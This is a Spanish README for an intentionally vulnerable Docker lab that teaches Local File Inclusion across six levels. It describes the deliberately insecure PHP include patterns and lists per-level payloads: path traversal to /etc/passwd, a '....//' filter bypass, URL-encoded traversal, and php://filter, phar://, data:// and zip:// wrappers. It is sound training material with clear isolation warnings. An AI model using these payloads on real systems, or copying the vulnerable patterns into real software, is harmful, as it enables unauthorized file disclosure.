# README — Laboratorio LFI (Laboratorio educativo)

**Resumen rápido:**
Laboratorio intencionalmente vulnerable para practicar Local File Inclusion (LFI) en varios niveles de dificultad. Diseñado para ejecutarse **localmente** con Docker. NO subir a hosting público. Ideal para clases, ejercicios y clonación desde GitHub.

---

# Contenido del repositorio

```
lfi-lab/
├── docker-compose.yml
├── web/
│   ├── index.php
│   ├── assets/
│   │   └── style.css
│   ├── nivel1/
│   │   ├── index.php
│   │   └── languages/
│   │       ├── es.php
│   │       └── en.php
│   ├── nivel2/
│   ├── nivel3/
│   ├── nivel4/
│   ├── nivel5/
│   ├── nivel6/
│   │   ├── index.php
│   │   ├── welcome.php
│   │   └── create_phar.php
│   ├── flags/
│   │   ├── level1.txt
│   │   ├── level2.txt
│   │   └── ... level6.txt
│   └── progress.json
└── README.md
```

---

# Riesgos de seguridad (leer primero)

* Este repositorio **contiene vulnerabilidades intencionales**.
* **NO** subir `web/` a un hosting compartido o público (Banahosting, cPanel, etc.). Puedes ser suspendido o comprometer otros sitios.
* Usa el laboratorio **solo** en una máquina local aislada o en una VM dedicada (NAT, sin puertos abiertos al público).
* Antes de ejecutar, asegúrate de entender que los archivos son deliberadamente inseguros.

---

# Requisitos

* Docker y docker-compose instalados (versión moderna).
* Git (para clonar).
* Acceso a la terminal/SSH si trabajas en VM.

---

# Despliegue (rápido)

1. Clona el repositorio:

```bash
git clone https://github.com/tu-usuario/lfi-lab.git
cd lfi-lab
```

2. Levanta el contenedor:

```bash
docker-compose up -d --build
```

3. Abrir en el navegador:

```
http://127.0.0.1:8080/
```

4. Parar / borrar contenedores:

```bash
docker-compose down
```

---

# Estructura y propósito de cada nivel

* **Nivel 1 — LFI básico**
  `web/nivel1/index.php` — include directo del parámetro `language`. Objetivo: leer archivos locales (ej. `/etc/passwd`) y obtener la flag `flags/level1.txt`.

* **Nivel 2 — Path Traversal clásico**
  `web/nivel2/index.php` — `include("./languages/" . $_GET['language']);`. Objetivo: usar `../../...` para salir del directorio `languages/`.

* **Nivel 3 — Prefijo de nombre**
  `web/nivel3/index.php` — `include("lang_" . $_GET['language']);`. Muestra cómo un prefijo no impide traversal si se usan `..` y slashes adecuadamente.

* **Nivel 4 — Filtros no recursivos**
  `web/nivel4/index.php` — aplica `str_replace('../','', $param)` (mitigación ingenua). Bypass: usar `....//....//` que no es eliminado por el replace.

* **Nivel 5 — URL-encoded required**
  `web/nivel5/index.php` — exige que el payload venga URL-encoded (`%2e%2e%2f...`). Practica encoding y decoding.

* **Nivel 6 — Wrappers PHP**
  `web/nivel6/index.php` — explorar `php://filter`, `data://`, `phar://`, `zip://`, `compress.zlib://` y técnicas para obtener el código fuente. Incluye `welcome.php` y script para crear `example.phar`.

---

# `progress.json` — control de avance

* Archivo: `web/progress.json`
* Formato simple esperado por el código:

```json
{
  "level1": true,
  "level2": true,
  "level3": true,
  "level4": true,
  "level5": false,
  "level6": false
}
```

* Cada `index.php` lee `progress.json` para exigir completar el nivel anterior.
* **Permisos:** PHP (usuario `www-data` en contenedor) debe poder escribir `progress.json`. Desde host:

```bash
touch web/progress.json
sudo chown 33:33 web/progress.json   # UID/GID 33 = www-data en imágenes oficiales
sudo chmod 664 web/progress.json
```

* Desde dentro del contenedor:

```bash
docker-compose exec web bash
cd /var/www/html
touch progress.json
chown www-data:www-data progress.json
chmod 664 progress.json
```

---

# Flags

* Flags se guardan en `web/flags/levelN.txt`. No las borres ni otras las cambies si quieres usar las comprobaciones automáticas.

---

# Crear example.phar (opcional, para Nivel 6)

Para que `phar://...` funcione, crea `example.phar`:

1. Entra al contenedor:

```bash
docker-compose exec web bash
```

2. Ejecuta el script (si `phar.readonly=1` usa la variante con `-d`):

```bash
php -d phar.readonly=0 nivel6/create_phar.php
```

3. Ajusta permisos si hace falta:

```bash
chown www-data:www-data /var/www/html/example.phar
chmod 644 /var/www/html/example.phar
```

---

# Ejemplos de payloads útiles (por nivel)

> Usa estos en el campo `language` en las páginas de cada nivel.

* **Nivel 1**

  * `?language=/etc/passwd`

* **Nivel 2**

  * `?language=../../../../../../etc/passwd`
  * `?language=../../../../etc/passwd` (ajusta cantidad)

* **Nivel 3**

  * `?language=../../../../../../etc/passwd` (incluye prefijo `lang_`, prueba variantes con y sin `/`)

* **Nivel 4** (bypass `str_replace('../','',...)`)

  * `?language=....//....//....//etc/passwd`
  * Repetir `....//` N veces según profundidad

* **Nivel 5** (URL-encoded)

  * `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`  (equiv. a `../../../../etc/passwd`)
  * `php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Denivel6%2Fwelcome`

* **Nivel 6** (wrappers)

  * `php://filter/read=convert.base64-encode/resource=nivel6/welcome`
  * `php://filter/read=convert.base64-encode/resource=welcome` (según include target)
  * `phar:///var/www/html/example.phar#welcome.php`
  * `data:text/plain;base64,PD9waHAgZWNobyAnSG9sYSc7ID8+`
  * `zip:///var/www/html/example.zip#welcome.php` (si creas zip)

---

# Debug y consejos

* Si no ves salida, mira el comentario HTML que cada nivel incluye en la fuente (Ctrl+U) — contiene `include_target = ...` o `decoded_include_target`. Te muestra exactamente qué string intenta incluir PHP.
* Si ves *warnings* sobre `file_put_contents(... progress.json): Permission denied` — revisa permisos (ver sección `progress.json` arriba).
* Para ver errores PHP durante debugging (solo local):

  * Temporalmente en el archivo del nivel, activa:

    ```php
    ini_set('display_errors', 1);
    error_reporting(E_ALL);
    ```
  * **No dejes esto en un entorno público.**

---

# Reset del laboratorio

* Para limpiar progreso:

```bash
echo '{}' > web/progress.json
# o dentro del contenedor:
echo '{}' > /var/www/html/progress.json
```

* Para detener y borrar contenedores:

```bash
docker-compose down
```

---

# Buenas prácticas para docentes

* Ejecuta cada sesión en VM local por estudiante o grupo (por ejemplo, cada grupo en su propia VM con Docker).
* No compartas el laboratorio en un hosting público sin **aislamiento extremo** (firewall, autenticación, acceso limitado).
* Considera usar versiones “simuladas” (no vulnerables) para demostración pública y mantener la versión vulnerable solo en entornos cerrados.

---

# Contribuciones y ajustes

* Si quieres:

  * Añadir formatos por usuario (progress por estudiante).
  * Registrar intentos en un log (IP, payload).
  * Integrar con un sistema de autenticación para clases.
  * Añadir más wrappers o retos (zip, compress.bzip2, phar con stub malicioso).
* Abre un *issue* o PR con tu propuesta.

---

# Licencia

Este repo es para **propósitos educativos**. Usa bajo tu propia responsabilidad. Añade una licencia en el repo (por ejemplo MIT) si quieres permitir contribuciones públicas.

---


